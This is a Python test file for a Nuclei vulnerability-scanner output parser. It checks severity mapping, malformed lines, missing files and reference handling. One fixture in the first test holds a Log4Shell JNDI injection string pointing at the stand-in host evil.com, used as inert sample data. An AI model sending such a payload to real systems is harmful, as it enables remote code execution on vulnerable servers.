"""Tests for the Nuclei output parser."""

from __future__ import annotations

import json
import os
import tempfile

import pytest

from app.models.base import Severity
from app.pipeline.parsers.nuclei import NucleiFinding, parse_nuclei_output


def _write_jsonl(lines: list[dict]) -> str:
    fd, path = tempfile.mkstemp(suffix=".jsonl")
    with os.fdopen(fd, "w") as f:
        for line in lines:
            f.write(json.dumps(line) + "\n")
    return path


class TestParseNucleiOutput:
    def test_valid_output(self) -> None:
        data = [
            {
                "template-id": "CVE-2021-44228",
                "info": {
                    "name": "Log4Shell RCE",
                    "severity": "critical",
                    "description": "Apache Log4j2 JNDI RCE",
                    "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
                },
                "host": "https://example.com",
                "matched-at": "https://example.com/api",
                "extracted-results": ["${jndi:ldap://evil.com/a}"],
            },
            {
                "template-id": "tech-detect:nginx",
                "info": {
                    "name": "Nginx Detection",
                    "severity": "info",
                    "description": "Nginx web server detected",
                },
                "host": "https://example.com",
                "matched-at": "https://example.com",
            },
        ]
        path = _write_jsonl(data)
        try:
            findings = parse_nuclei_output(path)
            assert len(findings) == 2
            assert isinstance(findings[0], NucleiFinding)

            critical = findings[0]
            assert critical.template_id == "CVE-2021-44228"
            assert critical.name == "Log4Shell RCE"
            assert critical.severity == Severity.CRITICAL
            assert critical.host == "https://example.com"
            assert critical.url == "https://example.com/api"
            assert critical.matched_at == "https://example.com/api"
            assert len(critical.reference) == 1
            assert critical.extracted_results == ["${jndi:ldap://evil.com/a}"]

            info_finding = findings[1]
            assert info_finding.severity == Severity.INFO
            assert info_finding.extracted_results is None
        finally:
            os.unlink(path)

    def test_unknown_severity_defaults_to_info(self) -> None:
        data = [
            {
                "template-id": "test",
                "info": {"name": "Test", "severity": "unknown_level"},
                "host": "https://example.com",
                "matched-at": "https://example.com",
            }
        ]
        path = _write_jsonl(data)
        try:
            findings = parse_nuclei_output(path)
            assert len(findings) == 1
            assert findings[0].severity == Severity.INFO
        finally:
            os.unlink(path)

    def test_malformed_line_skipped(self) -> None:
        fd, path = tempfile.mkstemp(suffix=".jsonl")
        with os.fdopen(fd, "w") as f:
            f.write(json.dumps({"template-id": "good", "info": {"name": "Good", "severity": "high"}, "host": "h", "matched-at": "m"}) + "\n")
            f.write("broken json line\n")
        try:
            findings = parse_nuclei_output(path)
            assert len(findings) == 1
            assert findings[0].severity == Severity.HIGH
        finally:
            os.unlink(path)

    def test_file_not_found(self) -> None:
        findings = parse_nuclei_output("/nonexistent/file.jsonl")
        assert findings == []

    def test_empty_file(self) -> None:
        fd, path = tempfile.mkstemp(suffix=".jsonl")
        os.close(fd)
        try:
            findings = parse_nuclei_output(path)
            assert findings == []
        finally:
            os.unlink(path)

    def test_reference_as_none(self) -> None:
        data = [
            {
                "template-id": "test",
                "info": {"name": "Test", "severity": "medium", "reference": None},
                "host": "h",
                "matched-at": "m",
            }
        ]
        path = _write_jsonl(data)
        try:
            findings = parse_nuclei_output(path)
            assert findings[0].reference == []
        finally:
            os.unlink(path)

    def test_reference_as_string(self) -> None:
        data = [
            {
                "template-id": "test",
                "info": {"name": "Test", "severity": "low", "reference": "https://example.com"},
                "host": "h",
                "matched-at": "m",
            }
        ]
        path = _write_jsonl(data)
        try:
            findings = parse_nuclei_output(path)
            assert findings[0].reference == ["https://example.com"]
        finally:
            os.unlink(path)

    def test_all_severity_levels(self) -> None:
        data = []
        for sev in ["critical", "high", "medium", "low", "info"]:
            data.append(
                {
                    "template-id": f"test-{sev}",
                    "info": {"name": f"Test {sev}", "severity": sev},
                    "host": "h",
                    "matched-at": "m",
                }
            )
        path = _write_jsonl(data)
        try:
            findings = parse_nuclei_output(path)
            assert len(findings) == 5
            assert findings[0].severity == Severity.CRITICAL
            assert findings[1].severity == Severity.HIGH
            assert findings[2].severity == Severity.MEDIUM
            assert findings[3].severity == Severity.LOW
            assert findings[4].severity == Severity.INFO
        finally:
            os.unlink(path)
